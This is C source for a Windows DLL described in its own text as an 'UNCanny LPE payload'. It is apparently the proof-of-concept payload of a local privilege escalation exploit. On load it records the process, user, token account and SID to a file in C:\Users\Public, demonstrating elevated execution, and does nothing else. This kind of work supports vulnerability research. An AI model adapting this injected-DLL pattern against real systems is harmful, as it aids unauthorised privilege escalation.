#include <windows.h>
#include <stdio.h>
#include <sddl.h>

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
	char proof[4096];
	char line[1024];
	WCHAR wide[MAX_PATH];
	DWORD wide_len;
	HANDLE token;
	BYTE token_buf[SECURITY_MAX_SID_SIZE + sizeof(TOKEN_USER)];
	DWORD needed;
	PTOKEN_USER token_user;
	WCHAR account[256];
	WCHAR domain[256];
	DWORD account_len;
	DWORD domain_len;
	SID_NAME_USE use;
	WCHAR *sid_text;
	HANDLE file;
	DWORD written;
	int proof_len;

	(void)reserved;

	if (reason != DLL_PROCESS_ATTACH)
		return TRUE;

	DisableThreadLibraryCalls(instance);

	proof_len = snprintf(proof, sizeof(proof), "UNCanny LPE payload loaded\r\npid: %lu\r\n", GetCurrentProcessId());

	if (GetModuleFileNameW(NULL, wide, MAX_PATH)) {
		WideCharToMultiByte(CP_UTF8, 0, wide, -1, line, sizeof(line), NULL, NULL);
		proof_len += snprintf(proof + proof_len, sizeof(proof) - (size_t)proof_len, "image: %s\r\n", line);
	}

	wide_len = (DWORD)(sizeof(wide) / sizeof(wide[0]));
	if (GetUserNameW(wide, &wide_len)) {
		WideCharToMultiByte(CP_UTF8, 0, wide, -1, line, sizeof(line), NULL, NULL);
		proof_len += snprintf(proof + proof_len, sizeof(proof) - (size_t)proof_len, "GetUserNameW: %s\r\n", line);
	}

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		memset(token_buf, 0, sizeof(token_buf));
		token_user = (PTOKEN_USER)token_buf;

		if (GetTokenInformation(token, TokenUser, token_buf, sizeof(token_buf), &needed)) {
			account_len = (DWORD)(sizeof(account) / sizeof(account[0]));
			domain_len = (DWORD)(sizeof(domain) / sizeof(domain[0]));

			if (LookupAccountSidW(NULL, token_user->User.Sid, account, &account_len, domain, &domain_len, &use)) {
				WideCharToMultiByte(CP_UTF8, 0, domain, -1, line, sizeof(line), NULL, NULL);
				proof_len += snprintf(proof + proof_len, sizeof(proof) - (size_t)proof_len, "token domain: %s\r\n", line);
				WideCharToMultiByte(CP_UTF8, 0, account, -1, line, sizeof(line), NULL, NULL);
				proof_len += snprintf(proof + proof_len, sizeof(proof) - (size_t)proof_len, "token account: %s\r\n", line);
			}

			if (ConvertSidToStringSidW(token_user->User.Sid, &sid_text)) {
				WideCharToMultiByte(CP_UTF8, 0, sid_text, -1, line, sizeof(line), NULL, NULL);
				proof_len += snprintf(proof + proof_len, sizeof(proof) - (size_t)proof_len, "token sid: %s\r\n", line);
				LocalFree(sid_text);
			}
		}

		CloseHandle(token);
	}

	file = CreateFileW(L"C:\\Users\\Public\\uncanny_lpe.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE) {
		WriteFile(file, proof, (DWORD)proof_len, &written, NULL);
		CloseHandle(file);
	}

	return TRUE;
}
